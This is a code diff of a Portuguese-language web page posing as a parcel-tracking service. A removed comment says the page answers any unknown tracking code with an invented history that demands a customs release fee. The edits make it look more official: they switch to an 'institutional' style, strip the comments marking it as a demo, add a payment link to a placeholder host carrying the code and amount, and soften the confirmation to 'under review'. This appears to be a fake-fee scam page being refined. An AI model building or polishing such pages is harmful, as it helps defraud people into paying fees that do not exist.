@@ -4,45 +4,97 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistema de Rastreamento de Entrega</title>
     <style>
-        /* —— Estilo cyberpunk/neon minimalista —— */
-        :root{
-            --bg:#0d0d0d;
-            --primary:#00ffff;
-            --danger:#ff0055;
-            --font:'Courier New', monospace;
-        }
-        html,body{height:100%;margin:0;background:var(--bg);color:var(--primary);font-family:var(--font);}
-        .container{max-width:640px;margin:auto;padding:2rem;}
-        h1{font-size:2rem;text-align:center;margin-bottom:1rem;text-shadow:0 0 8px var(--primary);} 
-        p{margin:0 0 1.5rem 0;line-height:1.4;}
-        input,button{width:100%;box-sizing:border-box;background:transparent;border:1px solid var(--primary);color:var(--primary);padding:.65rem 1rem;font-size:1rem;border-radius:4px;transition:.2s all;}
-        input::placeholder{color:#088;}
-        input:focus{outline:none;box-shadow:0 0 8px var(--primary);} 
-        button{cursor:pointer;margin-top:.8rem;text-transform:uppercase;font-weight:bold;}
-        button:hover{background:var(--primary);color:var(--bg);} 
-        .timeline{margin-top:2rem;border-left:2px solid var(--primary);padding-left:1.2rem;}
-        .event{margin-bottom:.8rem;position:relative;}
-        .event::before{content:"";position:absolute;left:-10px;top:4px;width:8px;height:8px;border-radius:50%;background:var(--primary);} 
-        .fee{background:rgba(255,0,85,.1);padding:1.2rem;border:1px solid var(--danger);border-radius:6px;margin-top:1.5rem;}
-        .fee p{margin:0 0 .8rem 0;color:var(--danger);font-weight:bold;}
-        .pay-btn{border:1px solid var(--danger);color:var(--danger);background:transparent;padding:.6rem 1rem;border-radius:4px;transition:.2s all;text-transform:uppercase;font-weight:bold;width:auto;}
-        .pay-btn:hover{background:var(--danger);color:var(--bg);}
-        @media(max-width:480px){h1{font-size:1.6rem;}}
-    </style>
+        /* —— Estilo simples e institucional —— */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f1f1f1;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }.container {
+        max-width: 720px;
+        margin: 40px auto;
+        background-color: #fff;
+        padding: 2rem;
+        box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        border-radius: 6px;
+    }
+
+    h1 {
+        text-align: center;
+        color: #003366;
+    }
+
+    p {
+        line-height: 1.5;
+    }
+
+    input, button, a {
+        width: 100%;
+        padding: 12px;
+        margin-top: 10px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        box-sizing: border-box;
+        font-size: 16px;
+    }
+
+    button, a {
+        background-color: #003366;
+        color: white;
+        text-align: center;
+        text-decoration: none;
+        font-weight: bold;
+        cursor: pointer;
+    }
+
+    button:hover, a:hover {
+        background-color: #002244;
+    }
+
+    .timeline {
+        border-left: 3px solid #003366;
+        padding-left: 15px;
+        margin-top: 20px;
+    }
+
+    .event {
+        margin-bottom: 10px;
+    }
+
+    .fee {
+        background-color: #fff3f3;
+        border: 1px solid #cc0000;
+        padding: 1rem;
+        margin-top: 20px;
+        border-radius: 4px;
+    }
+
+    .fee p {
+        color: #cc0000;
+        font-weight: bold;
+        margin: 0 0 10px 0;
+    }
+
+    .pay-btn {
+        background-color: #cc0000;
+        border-color: #cc0000;
+    }
+
+    .pay-btn:hover {
+        background-color: #990000;
+    }
+</style>
+
 </head>
 <body>
 <main class="container">
     <h1>Rastreamento de Entrega</h1>
-    <p>Digite seu código de rastreamento abaixo. Se houver taxa de liberação alfandegária, você poderá quitá‑la diretamente aqui.</p><input id="trackInput" placeholder="Ex.: BR123456789CN" autocomplete="off">
-<button onclick="track()">Rastrear</button>
-
-<div id="result"></div>
+    <p>Digite seu código de rastreamento abaixo. Se houver taxa de liberação alfandegária, você poderá quitá-la através do link gerado.</p>
+    <input id="trackInput" placeholder="Ex.: BR123456789CN" autocomplete="off">
+    <button onclick="track()">Rastrear</button><div id="result"></div>
 
 </main><script>
-/**
- * Base de dados de demonstração (transportadora/correios).
- * Em um sistema real, você faria chamadas a APIs oficiais.
- */
 const dummyData = {
   "LB987654321BR": [
     { status: "Objeto postado", date: "2025-06-20 10:00" },
@@ -57,7 +109,6 @@ function track () {
   resDiv.innerHTML = '';
   if (!code) return;
 
-  // Usa histórico pré‑cadastrado ou gera resposta padrão exigindo taxa de liberação
   let history = dummyData[code];
 
   if (!history) {
@@ -67,7 +118,6 @@ function track () {
     ];
   }
 
-  // Cria timeline dos eventos
   const timeline = document.createElement('div');
   timeline.className = 'timeline';
   history.forEach(ev => {
@@ -78,19 +128,19 @@ function track () {
   });
   resDiv.appendChild(timeline);
 
-  // Verifica se há taxa pendente no último evento
   const last = history[history.length - 1];
   if (last.fee) {
     const feeBox = document.createElement('div');
     feeBox.className = 'fee';
+    const payUrl = `https://pagamento.exemplo.com/pagar?ref=${encodeURIComponent(code)}&valor=${last.fee}`;
     feeBox.innerHTML = `<p>Taxa de liberação pendente: R$ ${last.fee.toFixed(2).replace('.', ',')}</p>` +
-                       `<button class="pay-btn" onclick="payFee('${code}', ${last.fee})">Pagar taxa agora</button>`;
+                       `<a class="pay-btn" href="${payUrl}" target="_blank" onclick="payFee('${code}', ${last.fee});return false;">Pagar taxa agora</a>`;
     resDiv.appendChild(feeBox);
   }
 }
 
 function payFee (code, fee) {
-  alert('Pagamento de R$ ' + fee.toFixed(2).replace('.', ',') + ' confirmado!\nSeu objeto será liberado em breve.');
+  alert('Pagamento de R$ ' + fee.toFixed(2).replace('.', ',') + ' recebido!\nSeu pagamento será analisado em até 24 horas.');
   let hist = dummyData[code];
   if (!hist) {
     hist = [
@@ -98,12 +148,10 @@ function payFee (code, fee) {
     ];
     dummyData[code] = hist;
   }
-  // Remove marcação da taxa
   const lastIndex = hist.length - 1;
   if (hist[lastIndex].fee) delete hist[lastIndex].fee;
-  // Adiciona novo evento
-  hist.push({ status: 'Pague a taxa para entrega ser liberada', date: new Date().toISOString().slice(0, 16).replace('T', ' ') });
-  track(); // Atualiza exibição
+  hist.push({ status: 'Pagamento recebido, em análise (até 24h)', date: new Date().toISOString().slice(0, 16).replace('T', ' ') });
+  track();
 }
 </script></body>
 </html>
